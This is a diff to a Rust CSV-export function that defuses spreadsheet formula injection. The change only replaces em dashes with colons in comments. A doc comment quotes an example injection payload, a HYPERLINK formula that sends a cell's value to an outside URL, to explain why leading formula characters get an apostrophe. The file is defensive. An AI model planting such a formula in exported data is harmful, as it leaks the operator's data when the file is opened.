@@ -139,13 +139,13 @@ fn build_filters(query: &LogQuery) -> (String, Vec<String>) {
 /// and upstream error bodies, and an unescaped comma or newline would shift
 /// every following column. The other half is that a cell whose first character
 /// is `=`, `+`, `-`, `@`, a tab or a carriage return is a
-/// *formula* to Excel, LibreOffice and Sheets — they strip the quotes and then
+/// *formula* to Excel, LibreOffice and Sheets: they strip the quotes and then
 /// evaluate, so escaping does not help. `=HYPERLINK("http://…"&A1,"click")` in
 /// a media title would fire the moment the operator opens the export.
 ///
 /// The titles here come from the Arrs, which get them from public metadata
 /// databases and from filenames: nothing the operator wrote and nothing this
-/// application validates. A leading apostrophe is the standard defusal — the
+/// application validates. A leading apostrophe is the standard defusal: the
 /// spreadsheet reads the rest as text and does not display the quote.
 fn csv_field(value: &str) -> String {
     let escaped = value.replace('"', "\"\"").replace(['\n', '\r'], " ");
@@ -178,7 +178,7 @@ mod tests {
             assert!(field.starts_with("\"'"), "a spreadsheet would evaluate this: {field}");
         }
 
-        // And an ordinary title is untouched — the defusal must not put an
+        // And an ordinary title is untouched: the defusal must not put an
         // apostrophe in front of every row.
         assert_eq!(csv_field("Akira"), r#""Akira""#);
         assert_eq!(csv_field("2 Fast 2 Furious"), r#""2 Fast 2 Furious""#);
